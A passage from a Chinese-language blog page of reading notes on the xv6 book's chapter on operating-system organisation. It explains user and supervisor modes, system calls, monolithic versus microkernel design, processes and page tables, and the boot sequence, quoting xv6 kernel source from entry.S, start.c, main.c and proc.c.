<li>答案是，我们可以把图 1.2 中的系统调用作为一个库来实现，应用程序与之连接。</li>
<li>在这个想法中，每个应用程序可以根据自己的需要定制自己的库。</li>
<li>应用程序可以直接与硬件资源进行交互，并以最适合应用程序的方式使用这些资源（例如，实现高效、可预测的性能）。</li>
<li>一些用于嵌入式设备或实时系统的操作系统就是以这种方式组织的。</li>
</ul>
</li>
<li><p>这种系统库方式的缺点是，如果有多个应用程序在运行，这些应用程序必须正确执行。</p>
<ul>
<li>例如，每个应用程序必须定期放弃 CPU，以便其他应用程序能够运行。</li>
<li>如果所有的应用程序都相互信任并且没有 bug，这样的 <strong>cooperative</strong> 分时方案可能是 OK 的。</li>
<li>更典型的情况是，应用程序之间互不信任，并且有 bug，所以人们通常希望比 <strong>cooperative</strong> 方案提供更强的隔离性。</li>
</ul>
</li>
<li><p>为了实现强隔离，禁止应用程序直接访问敏感的硬件资源，而将资源抽象为服务是很有帮助的。</p>
<ul>
<li>例如，Unix 应用程序只通过文件系统的 <code>open</code>、<code>read</code>、<code>write</code> 和 <code>close</code> 系统调用与文件系统进行交互，而不是直接读写磁盘。</li>
<li>这为应用程序带来了路径名的便利，而且它允许操作系统（作为接口的实现者）管理磁盘。</li>
<li>即使不考虑隔离问题，那些有意交互的程序（或者只是希望互不干扰）很可能会发现文件系统是一个比直接使用磁盘更方便的抽象。</li>
</ul>
</li>
<li><p>同样，Unix 在进程之间透明地切换硬件 CPU，必要时保存和恢复寄存器状态，这样应用程序就不必意识到时间共享。</p>
<ul>
<li>这种透明性允许操作系统共享 CPU，即使一些应用程序处于无限循环中。</li>
</ul>
</li>
<li><p>另一个例子是，Unix 进程使用 <code>exec</code> 来建立它们的内存映像，而不是直接与物理内存交互。</p>
<ul>
<li>这使得操作系统可以决定将进程放在内存的什么位置；如果内存紧张，操作系统甚至可能将进程的部分数据存储在磁盘上。</li>
<li><code>exec</code> 还允许用户将可执行文件储存在文件系统中。</li>
</ul>
</li>
<li><p>Unix 进程之间的许多形式的交互都是通过文件描述符进行的。</p>
<ul>
<li>文件描述符不仅可以抽象出许多细节（例如，管道或文件中的数据存储在哪里），而且它们的定义方式也可以简化交互。</li>
<li>例如，如果管道中的一个应用程序崩溃了，内核就会为管道中的另一个进程产生一个文件结束信号。</li>
</ul>
</li>
<li><p>图 1.2 中的系统调用接口经过精心设计，既为程序员提供了便利，又提供了强隔离的可能。</p>
<ul>
<li>Unix接口并不是抽象资源的唯一方式，但事实证明它是一种非常好的方式。</li>
</ul>
</li>
</ul>
<h2 id="User-mode-supervisor-mode-and-system-calls-用户模式，内核模式，和系统调用"><a href="#User-mode-supervisor-mode-and-system-calls-用户模式，内核模式，和系统调用" class="headerlink" title="User mode, supervisor mode, and system calls 用户模式，内核模式，和系统调用"></a>User mode, supervisor mode, and system calls 用户模式，内核模式，和系统调用</h2><ul>
<li><p>强隔离要求应用程序和操作系统之间有一个分界线。</p>
<ul>
<li>如果应用程序发生错误，我们不希望操作系统崩溃，也不希望其他应用程序崩溃。</li>
<li>相反，操作系统应该能够清理崩溃的应用程序并继续运行其他应用程序。</li>
<li>为了实现强隔离，操作系统必须安排应用程序不能修改（甚至不能读取）操作系统的数据结构和指令，应用程序不能访问其他进程的内存。</li>
</ul>
</li>
<li><p>CPU 提供了强隔离的硬件支持。</p>
<ul>
<li>例如，RISC-V 有三种模式，CPU 可以执行指令：<strong>机器模式</strong>、<strong>监督者（supervisor）模式</strong> 和 <strong>用户模式</strong>。</li>
<li>在机器模式下执行的指令具有完全的权限，一个CPU在机器模式下启动。机器模式主要用于配置计算机。</li>
<li>xv6 会在机器模式下执行几条指令，然后转为监督者模式。</li>
</ul>
</li>
<li><p>在监督者（supervisor）模式下，CPU 被允许执行特权指令：例如，启用和禁用中断，读写保存页表地址的寄存器等。</p>
<ul>
<li>如果用户模式下的应用程序试图执行一条特权指令，CPU 不会执行该指令，而是切换到监督者模式，这样监督者模式的代码就可以终止该应用程序，因为它做了不该做的事情。</li>
<li>第 1 章的图 1.1 说明了这种组织方式。</li>
<li>一个应用程序只能执行用户模式的指令（如数字相加等），被称为运行在用户空间，而处于监督者模式的软件也可以执行特权指令，被称为运行在内核空间。</li>
<li>运行在内核空间（或监督者模式）的软件称为内核。</li>
</ul>
</li>
<li><p>一个应用程序如果要调用内核函数（如 xv6 中的 <code>read</code> 系统调用），必须过渡到内核。</p>
<ul>
<li>CPU 提供了一个特殊的指令，可以将 CPU 从用户模式切换到监督者模式，并在内核指定的入口处进入内核。( RISC-V 为此提供了 <code>ecall</code> 指令。)</li>
<li>一旦 CPU 切换到监督者模式，内核就可以验证系统调用的参数，决定是否允许应用程序执行请求的操作，然后拒绝或执行该操作。</li>
<li>由内核控制监督者模式的入口点是很重要的；如果应用程序可以决定内核的入口点，那么恶意应用程序就能够在跳过参数验证的情况下进入内核。</li>
</ul>
</li>
</ul>
<h2 id="Kernel-organization-内核组织"><a href="#Kernel-organization-内核组织" class="headerlink" title="Kernel organization 内核组织"></a>Kernel organization 内核组织</h2><ul>
<li><p>一个关键的设计问题是操作系统的哪一部分应该在监督者模式下运行。</p>
<ul>
<li>一种可能是整个操作系统驻留在内核中，这样所有系统调用的实现都在监督者模式下运行。这种组织方式称为 <strong>宏内核</strong>。</li>
</ul>
</li>
<li><p>在这种组织方式中，整个操作系统以全硬件权限运行。</p>
<ul>
<li>这种组织方式很方便，因为操作系统设计者不必决定操作系统的哪一部分不需要全硬件权限。</li>
<li>此外，操作系统的不同部分更容易合作。例如，一个操作系统可能有一个缓冲区，其被缓存文件系统和虚拟内存系统共享。</li>
</ul>
</li>
<li><p>宏内核组织方式的一个缺点是操作系统的不同部分之间的接口通常是复杂的（我们将在本文的其余部分看到），因此操作系统开发者很容易在这上面出错。</p>
</li>
<li><p>在宏内核中，一个错误是致命的，因为监督者模式下的错误往往会导致内核崩溃。</p>
</li>
<li><p>如果内核崩溃，计算机就会停止工作，因此所有的应用程序也会崩溃。计算机必须重启。</p>
</li>
<li><p>为了降低内核出错的风险，操作系统设计者可以尽量减少在监督者模式下运行的操作系统代码量，而在用户模式下执行操作系统的大部分代码。这种内核组织方式称为 <strong>微内核</strong>。</p>
</li>
</ul>
<img src="/2024/05/08/xv6-book-for-reading/Figure-2.1.png" class="" title="Figure-2.1">

<ul>
<li><p>图 2.1 说明了这种微内核设计。</p>
<ul>
<li>在图中，文件系统作为一个用户级进程运行。作为进程运行的 OS 服务称为服务器。</li>
<li>为了让应用程序与文件服务器进行交互，内核提供了一种进程间通信机制，用于从一个用户模式进程向另一个进程发送消息。</li>
<li>例如，如果一个像 shell 这样的应用程序想要读写文件，它就会向文件服务器发送一个消息，并等待响应。</li>
</ul>
</li>
<li><p>在微内核中，内核接口由一些低级函数组成，用于启动应用程序、发送消息、访问设备硬件等。</p>
<ul>
<li>这种组织方式使得内核相对简单，因为大部分操作系统驻留在用户级服务器中。</li>
</ul>
</li>
<li><p>xv6 和大多数 Unix 操作系统一样，是以宏内核的形式实现的。</p>
<ul>
<li>因此，xv6 内核接口与操作系统接口相对应，内核实现了完整的操作系统。</li>
<li>由于 xv6 不提供很多服务，所以它的内核比一些微内核要小，但从概念上讲 xv6 是宏内核。</li>
</ul>
</li>
</ul>
<h2 id="Code-xv6-organization-xv6-的组织结构"><a href="#Code-xv6-organization-xv6-的组织结构" class="headerlink" title="Code: xv6 organization xv6 的组织结构"></a>Code: xv6 organization xv6 的组织结构</h2><ul>
<li>xv6 内核源码在 <code>kernel/</code> 子目录下。<ul>
<li>按照模块化的概念，源码被分成了多个文件，图 2.2 列出了这些文件。模块间的接口在 <code>kernel/defs.h</code> 中定义。</li>
</ul>
</li>
</ul>
<img src="/2024/05/08/xv6-book-for-reading/Figure-2.2.png" class="" title="Figure-2.2">

<h2 id="Process-overview-进程概述"><a href="#Process-overview-进程概述" class="headerlink" title="Process overview 进程概述"></a>Process overview 进程概述</h2><ul>
<li><p>xv6 中的隔离单位（和其他 Unix 操作系统一样）是一个进程。</p>
<ul>
<li>进程抽象可以防止一个进程破坏或监视另一个进程的内存、CPU、文件描述符等。</li>
<li>它还可以防止进程破坏内核，所以进程不能破坏内核的隔离机制。</li>
<li>内核必须小心翼翼地实现进程抽象，因为一个错误或恶意的应用程序可能会欺骗内核或硬件做一些不好的事情（例如，规避隔离）。</li>
<li>内核用来实现进程的机制包括：用户&#x2F;监督模式标志、地址空间和线程的时间片轮转。</li>
</ul>
</li>
<li><p>为了帮助实施隔离，进程抽象为程序提供了一种错觉，即它有自己的私有机器。</p>
<ul>
<li>一个进程为程序提供了一个看似私有的内存系统，或者说是地址空间，其他进程不能对其进行读写。</li>
<li>进程还为程序提供了 “私有” 的 CPU，用来执行程序的指令。</li>
</ul>
</li>
<li><p>xv6 使用页表（由硬件实现）给每个进程提供自己的地址空间。</p>
<ul>
<li>RISC-V 页表将 <strong>虚拟地址</strong>（RISC-V 指令操作的地址）转换（或 “映射”）为 <strong>物理地址</strong>（CPU芯片发送到主存储器的地址）。</li>
</ul>
</li>
<li><p>xv6 为每个进程维护一个单独的页表，定义该进程的地址空间。</p>
<ul>
<li>如图 2.3 所示，进程的用户空间内存的地址空间是从虚拟地址0开始的。</li>
<li>指令存放在最前面，其次是全局变量，然后是栈，最后是一个堆区（用于 <strong>malloc</strong>），进程可以根据需要扩展。</li>
<li>有一些因素限制了进程地址空间的最大长度：RISC-V 上的指针是 64 位宽；硬件在页表中查找虚拟地址时只使用低的 39 位；xv6 只使用 39 位中的 38 位。</li>
<li>因此，最大地址是 $2^{38}-1$ &#x3D; 0x3fffffffff，也就是 <code>MAXVA</code>（kernel&#x2F;riscv.h:348）。</li>
<li>在地址空间的顶端，xv6 保留了一页，用于 <strong>trampoline</strong> 和映射进程 <strong>trapframe</strong> 的页，以便切换到内核，我们将在第 4 章中解释。</li>
</ul>
</li>
</ul>
<img src="/2024/05/08/xv6-book-for-reading/Figure-2.3.png" class="" title="Figure-2.3">

<ul>
<li>xv6 内核为每个进程维护了许多状态，记录在 <code>proc</code> 结构体 (kernel&#x2F;proc.h:86)。<ul>
<li>一个进程最重要的内核状态是它的页表、内核栈和运行状态。</li>
<li>我们用 <code>p-&gt;xxx</code> 来表示 <code>proc</code> 结构的元素，例如，<code>p-&gt;pagetable</code> 是指向进程页表的指针。</li>
</ul>
</li>
</ul>
<blockquote>
<p>kernel&#x2F;proc.h:86</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span>        <span class="comment">// Process state</span></span><br><span class="line">  <span class="type">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="type">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="type">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="type">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait_lock must be held when using this:</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>         <span class="comment">// Parent process</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="type">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p>每个进程都有一个执行线程（简称线程），执行进程的指令。</p>
<ul>
<li>一个线程可以被暂停，然后再恢复。</li>
<li>为了在进程之间透明地切换，内核会暂停当前运行的线程，并恢复另一个进程的线程。</li>
<li>线程的大部分状态（局部变量、函数调用返回地址）都存储在线程的栈中。</li>
<li>每个进程有两个栈：用户栈和内核栈（<code>p-&gt;kstack</code>）。</li>
<li>当进程在执行用户指令时，只有它的用户栈在被使用，而它的内核栈是空的。</li>
<li>当进程进入内核时（因为系统调用或中断），内核代码在进程的内核栈上执行；</li>
<li>当进程在内核中时，它的用户栈仍然包含保存的数据，但不被主动使用。</li>
<li>进程的线程在用户栈和内核栈中交替执行。</li>
<li>内核栈是独立的（并且受到保护，不受用户代码的影响），所以即使一个进程用户栈被破坏了，内核也可以执行。</li>
</ul>
</li>
<li><p>一个进程可以通过执行 RISC-V <code>ecall</code> 指令进行系统调用。</p>
<ul>
<li>该指令提高硬件权限级别，并将程序计数器改变为内核定义的入口点。</li>
<li>入口点的代码会切换到内核栈，并执行实现系统调用的内核指令。</li>
<li>当系统调用完成后，内核切换回用户栈，并通过调用 <code>sret</code> 指令返回用户空间，降低硬件特权级别，恢复执行系统调用前的用户指令。</li>
<li>进程的线程可以在内核中阻塞等待 I&#x2F;O，当 I&#x2F;O 完成后，再从离开的地方恢复。</li>
</ul>
</li>
<li><p><code>p-&gt;state</code> 表示进程是创建、就绪、运行、等待 I&#x2F;O，还是退出。</p>
</li>
<li><p><code>p-&gt;pagetable</code> 以 RISC-V 硬件需要的格式保存进程的页表，当进程在用户空间执行时，xv6 使分页硬件使用进程的 <code>p-&gt;pagetable</code>。</p>
<ul>
<li>进程的页表也会记录分配给该进程内存的物理页地址。</li>
</ul>
</li>
</ul>
<h2 id="Code-starting-xv6-and-the-first-process-启动xv6和第一个进程"><a href="#Code-starting-xv6-and-the-first-process-启动xv6和第一个进程" class="headerlink" title="Code: starting xv6 and the first process 启动xv6和第一个进程"></a>Code: starting xv6 and the first process 启动xv6和第一个进程</h2><ul>
<li><p>为了使 xv6 更加具体，我们将概述内核如何启动和运行第一个进程。后面的章节将更详细地描述这个概述中出现的机制。</p>
</li>
<li><p>当 RISC-V 计算机开机时，它会初始化自己，并运行一个存储在只读存储器中的 <strong>boot loader</strong>。<strong>boot loader</strong> 将 xv6 内核加载到内存中。</p>
<ul>
<li>然后，在机器模式下，CPU从 <code>_entry</code>（kernel&#x2F;entry.S:6）开始执行 xv6。</li>
<li>RISC-V 在禁用分页硬件的情况下启动：虚拟地址直接映射到物理地址。</li>
</ul>
</li>
</ul>
<blockquote>
<p>kernel&#x2F;entry.S</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">        # qemu -kernel loads the kernel at 0x80000000</span><br><span class="line">        # and causes each hart (i.e. CPU) to jump there.</span><br><span class="line">        # kernel.ld causes the following code to</span><br><span class="line">        # be placed at 0x80000000.</span><br><span class="line">.section .text</span><br><span class="line">.global _entry</span><br><span class="line">_entry:</span><br><span class="line">        # set up a stack for C.</span><br><span class="line">        # stack0 is declared in start.c,</span><br><span class="line">        # with a 4096-byte stack per CPU.</span><br><span class="line">        # sp = stack0 + (hartid * 4096)</span><br><span class="line">        la sp, stack0</span><br><span class="line">        li a0, 1024*4</span><br><span class="line">        csrr a1, mhartid</span><br><span class="line">        addi a1, a1, 1</span><br><span class="line">        mul a0, a0, a1</span><br><span class="line">        add sp, sp, a0</span><br><span class="line">        # jump to start() in start.c</span><br><span class="line">        call start</span><br><span class="line">spin:</span><br><span class="line">        j spin</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p>loader 将 xv6 内核加载到物理地址 <code>0x80000000</code> 的内存中。</p>
<ul>
<li>之所以将内核放在 <code>0x80000000</code> 而不是 <code>0x0</code>，是因为地址范围 <code>0x0:0x80000000</code> 包含 I&#x2F;O 设备。</li>
</ul>
</li>
<li><p><code>_entry</code> 处的指令设置了一个栈，这样 xv6 就可以运行 C 代码。</p>
<ul>
<li>xv6 在文件 <code>start.c</code> (kernel&#x2F;start.c:11) 中声明了初始栈的空间，即 <code>stack0</code>。</li>
<li>在 <code>_entry</code> 处的代码加载栈指针寄存器 <code>sp</code>，地址为 <code>stack0+4096</code>，也就是栈的顶部，因为 RISC-V 的栈是向下扩张的。</li>
<li>现在内核就拥有了栈，<code>_entry</code> 调用 <code>start</code> (kernel&#x2F;start.c:21)，并执行其 C 代码。</li>
</ul>
</li>
</ul>
<blockquote>
<p>kernel&#x2F;start.c:11</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// entry.S needs one stack per CPU.</span></span><br><span class="line">__attribute__ ((aligned (<span class="number">16</span>))) <span class="type">char</span> stack0[<span class="number">4096</span> * NCPU];</span><br></pre></td></tr></table></figure>

<p>kernel&#x2F;start.c:21</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// entry.S jumps here in machine mode on stack0.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// set M Previous Privilege mode to Supervisor, for mret.</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> x = r_mstatus();</span><br><span class="line">  x &amp;= ~MSTATUS_MPP_MASK;</span><br><span class="line">  x |= MSTATUS_MPP_S;</span><br><span class="line">  w_mstatus(x);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set M Exception Program Counter to main, for mret.</span></span><br><span class="line">  <span class="comment">// requires gcc -mcmodel=medany</span></span><br><span class="line">  w_mepc((uint64)main);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// disable paging for now.</span></span><br><span class="line">  w_satp(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// delegate all interrupts and exceptions to supervisor mode.</span></span><br><span class="line">  w_medeleg(<span class="number">0xffff</span>);</span><br><span class="line">  w_mideleg(<span class="number">0xffff</span>);</span><br><span class="line">  w_sie(r_sie() | SIE_SEIE | SIE_STIE | SIE_SSIE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// configure Physical Memory Protection to give supervisor mode</span></span><br><span class="line">  <span class="comment">// access to all of physical memory.</span></span><br><span class="line">  w_pmpaddr0(<span class="number">0x3fffffffffffff</span>ull);</span><br><span class="line">  w_pmpcfg0(<span class="number">0xf</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ask for clock interrupts.</span></span><br><span class="line">  timerinit();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// keep each CPU&#x27;s hartid in its tp register, for cpuid().</span></span><br><span class="line">  <span class="type">int</span> id = r_mhartid();</span><br><span class="line">  w_tp(id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// switch to supervisor mode and jump to main().</span></span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;mret&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><p>函数 <code>start</code> 执行一些只有在机器模式下才允许的配置，然后切换到监督者模式。</p>
<ul>
<li>为了进入监督者模式，RISC-V 提供了指令 <code>mret</code>。这条指令最常用来从上一次的调用中返回，上一次调用从监督者模式到机器模式。</li>
<li><code>start</code> 并不是从这样的调用中返回，而是把事情设置得像有过这样的调用一样：它在寄存器 <code>mstatus</code> 中把上一次的特权模式设置为特权者模式，它把 <code>main</code> 的地址写入寄存器 <code>mepc</code> 中，把返回地址设置为 <code>main</code> 函数的地址，在特权者模式中把 <code>0</code> 写入页表寄存器 <code>satp</code> 中，禁用虚拟地址转换，并把所有中断和异常委托给特权者模式。</li>
</ul>
</li>
<li><p>在进入特权者模式之前，<code>start</code> 还要执行一项任务：对时钟芯片进行编程以初始化定时器中断。</p>
<ul>
<li>在完成了这些基本管理后，<code>start</code> 通过调用 <code>mret</code> “返回” 到监督者模式。</li>
<li>这将导致程序计数器变为 <code>main</code>（kernel&#x2F;main.c:11）的地址。</li>
</ul>
</li>
</ul>
<blockquote>
<p>kernel&#x2F;main.c:11</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// start() jumps here in supervisor mode on all CPUs.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(cpuid() == <span class="number">0</span>)&#123;</span><br><span class="line">    consoleinit();</span><br><span class="line">    printfinit();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;xv6 kernel is booting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    kinit();         <span class="comment">// physical page allocator</span></span><br><span class="line">    kvminit();       <span class="comment">// create kernel page table</span></span><br><span class="line">    kvminithart();   <span class="comment">// turn on paging</span></span><br><span class="line">    procinit();      <span class="comment">// process table</span></span><br><span class="line">    trapinit();      <span class="comment">// trap vectors</span></span><br><span class="line">    trapinithart();  <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinit();      <span class="comment">// set up interrupt controller</span></span><br><span class="line">    plicinithart();  <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">    binit();         <span class="comment">// buffer cache</span></span><br><span class="line">    iinit();         <span class="comment">// inode table</span></span><br><span class="line">    fileinit();      <span class="comment">// file table</span></span><br><span class="line">    virtio_disk_init(); <span class="comment">// emulated hard disk</span></span><br><span class="line">    userinit();      <span class="comment">// first user process</span></span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    started = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(started == <span class="number">0</span>)</span><br><span class="line">      ;</span><br><span class="line">    __sync_synchronize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hart %d starting\n&quot;</span>, cpuid());</span><br><span class="line">    kvminithart();    <span class="comment">// turn on paging</span></span><br><span class="line">    trapinithart();   <span class="comment">// install kernel trap vector</span></span><br><span class="line">    plicinithart();   <span class="comment">// ask PLIC for device interrupts</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  scheduler();        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* 在 `main` (kernel/main.c:<span class="number">11</span>) 初始化几个设备和子系统后，它通过调用 `userinit` (kernel/proc.c:<span class="number">232</span>) 来创建第一个进程。</span><br><span class="line"> * 第一个进程执行一个用 RISC-V 汇编编写的小程序 `initcode.S`（user/initcode.S:<span class="number">1</span>），它通过调用 `exec` 系统调用重新进入内核。</span><br><span class="line"> * 正如我们在第一章中所看到的，`exec` 用一个新的程序（本例中是 `/init`）替换当前进程的内存和寄存器。</span><br><span class="line"></span><br><span class="line">kernel/proc.c:<span class="number">232</span></span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line"><span class="comment">// Set up first user process.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">userinit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">  p = allocproc();</span><br><span class="line">  initproc = p;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// allocate one user page and copy initcode&#x27;s instructions</span></span><br><span class="line">  <span class="comment">// and data into it.</span></span><br><span class="line">  uvmfirst(p-&gt;pagetable, initcode, <span class="keyword">sizeof</span>(initcode));</span><br><span class="line">  p-&gt;sz = PGSIZE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prepare for the very first &quot;return&quot; from kernel to user.</span></span><br><span class="line">  p-&gt;trapframe-&gt;epc = <span class="number">0</span>;      <span class="comment">// user program counter</span></span><br><span class="line">  p-&gt;trapframe-&gt;sp = PGSIZE;  <span class="comment">// user stack pointer</span></span><br><span class="line"></span><br><span class="line">  safestrcpy(p-&gt;name, <span class="string">&quot;initcode&quot;</span>, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line">  p-&gt;cwd = namei(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p-&gt;state = RUNNABLE;</span><br><span class="line"></span><br><span class="line">  release(&amp;p-&gt;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>user&#x2F;initcode.S:1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Initial process that execs /init.</span><br><span class="line"># This code runs in user space.</span><br><span class="line"></span><br><span class="line">#include &quot;syscall.h&quot;</span><br><span class="line"></span><br><span class="line"># exec(init, argv)</span><br><span class="line">.globl 